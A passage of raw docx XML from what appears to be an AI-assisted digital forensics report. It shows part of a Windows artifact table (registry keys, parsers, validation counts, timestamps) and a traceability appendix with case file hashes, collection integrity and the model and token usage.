              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 04:58:02.000487</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:13:21.000206</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Run keys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:44:03.540241</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:44:03.540241</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: SCSI</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:41:06.685887</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:24:07.157810</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: JumplistData</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 23:02:27.423989</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:47:39.879534</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: LastVisitedPidlMRU</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2020-09-18 23:07:44.037829</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.691657</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AppInit_DLLs (Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-12-07 09:17:27.101669</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:41:14.833965</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: VolumeInfoCache</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2020-09-18 05:47:08.858151</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:58.625064</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: CIDSizeMRU</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 23:07:44.075672</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.707429</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: portable devices (WPD)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:59.765675</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:59.765675</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: USBSTOR</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:58.406346</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:58.406346</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Appendix F: Traceability</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4986"/>
        <w:gridCol w:w="4986"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DuckDB database</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>C:\Sleuthline\cases\test04\db\case.duckdb</w:t>
              <w:br/>
              <w:t>SHA-256 b927c3176f6edd071ce009bfdc7c27966db091b024124998126d6298ede3ed84</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Pipeline version</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>commit 9615b51f9227; content sha256 507779379B984D32; deployed 2026-10-21 08:56</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Collection integrity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>INTACT: 2703 file(s) matching the SHA-1 recorded by KAPE, 0 different, 0 missing, 0 without KAPE hash, 0 expected difference(s) on files copied live in raw mode (checked on 2026-10-25T20:16:47+01:00)</w:t>
              <w:br/>
              <w:t>After parsing: no collection file modified by parsing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Normalization mappings</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>v2.2 sha256 8a32b59741d3439e43d8b015c92d36d65fbfff14a8f28ae100ad78305263d1ac</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Model</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>anthropic / claude-opus-5-5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Agent runs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2026-10-25T19:54:01Z → 2026-10-25T20:19:38Z: anthropic/claude-opus-5-5, playbook sha256 0833d7d614f54875…</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Usage</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>15,895,929 input tokens (of which 15,058,002 read from cache), 164,709 output tokens, 237 calls</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Full trace</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>C:\Sleuthline\cases\test04\analysis\transcript.jsonl: every SQL query, result and model answer</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Analysis state</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>C:\Sleuthline\cases\test04\analysis\findings.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Exports</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>iocs.csv, key_timeline.csv, incident_timeline.csv</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Reference format</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>&lt;output relative to parsed&gt;#&lt;record number&gt;: CSV data line (header excluded) or JSONL line</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Report generated on</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2026-10-25 20:19 UTC</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